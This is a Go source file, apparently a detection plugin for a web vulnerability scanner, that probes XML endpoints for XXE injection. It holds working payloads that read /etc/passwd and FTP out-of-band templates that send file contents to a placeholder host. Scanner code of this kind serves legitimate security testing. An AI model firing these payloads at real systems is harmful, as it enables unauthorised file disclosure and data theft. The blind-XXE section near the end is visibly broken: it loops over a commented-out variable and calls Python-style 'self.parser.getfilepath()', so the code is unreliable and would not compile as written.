package xxe

import (
	"glint/fastreq"
	"glint/plugin"
	"glint/util"
	"regexp"
	"strings"

	"github.com/thoas/go-funk"
)

var DefaultProxy = ""
var cert string
var mkey string

var ftp_template = `<!ENTITY % bbb SYSTEM "file:///tmp/"><!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'ftp://fakeuser:%bbb;@%HOSTNAME%:%FTP_PORT%/b'>">`
var ftp_client_file_template = `<!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'ftp://fakeuser:%bbb;@%HOSTNAME%:%FTP_PORT%/b'>">`

//bind-xxe
var reverse_template = []string{
	`<!DOCTYPE convert [<!ENTITY % remote SYSTEM "%s">%remote;]>`,
	`<!DOCTYPE uuu SYSTEM "%s">`,
}

func Xxe(args interface{}) (*util.ScanResult, error) {
	var err error
	util.Setup()
	group := args.(plugin.GroupData)
	// ORIGIN_URL := `http://not-a-valid-origin.xsrfprobe-csrftesting.0xinfection.xyz`
	ctx := *group.Pctx

	select {
	case <-ctx.Done():
		return nil, ctx.Err()
	default:
	}

	session := group.GroupUrls.(map[string]interface{})
	url := session["url"].(string)
	method := session["method"].(string)
	headers, _ := util.ConvertHeaders(session["headers"].(map[string]interface{}))
	body := []byte(session["data"].(string))
	cert = group.HttpsCert
	mkey = group.HttpsCertKey
	sess := fastreq.GetSessionByOptions(
		&fastreq.ReqOptions{
			Timeout:       2,
			AllowRedirect: true,
			Proxy:         DefaultProxy,
			Cert:          cert,
			PrivateKey:    mkey,
		})

	var ContentType string = "None"
	if value, ok := headers["Content-Type"]; ok {
		ContentType = value
	}

	// params, err := util.ParseUri(url, body, method, ContentType)
	// if err != nil {
	// 	logger.Error(err.Error())
	// 	return nil, err
	// }

	var xmlversion bool
	reg := `^\s*<\?xml`
	match, _ := regexp.MatchString(reg, string(body))
	if match {
		xmlversion = true
	}
	xmlversion_text := `<?xml version="1.0" encoding="UTF-8"?>`
	payloads := []string{
		`<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>`,
		`<?xml version="1.0" ?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>`,
	}
	//"application/xml;charset=UTF-8"
	if funk.Contains(ContentType, "text/xml") || funk.Contains(ContentType, "application/xml") {
		for _, pl := range payloads {
			if strings.ToUpper(method) == "POST" {
				req1, resp1, errs := sess.Post(url, headers, []byte(pl))
				if errs != nil {
					return nil, errs
				}
				body := string(resp1.Body())
				if funk.Contains(body, "root:[x*]:0:0:") {
					Result := util.VulnerableTcpOrUdpResult(url,
						"xxe Vulnerable",
						[]string{string(req1.String())},
						[]string{string(body)},
						"high",
						session["hostid"].(int64))
					return Result, errs
				}
			}
		}

		//bind-xxe

		//无回显显示器
		// bind_payloads := []string{
		// 	`<!DOCTYPE convert [<!ENTITY % remote SYSTEM "{}">%remote;]>`,
		// 	`<!DOCTYPE foo SYSTEM "{}">`,
		// }

		for _, pl := range bind_payloads {
			if xmlversion {
				pl_ := xmlversion_text + "\r\n" + pl
			}
			info := "xxe_" + self.parser.getfilepath()
		}

	}

	return nil, err
}
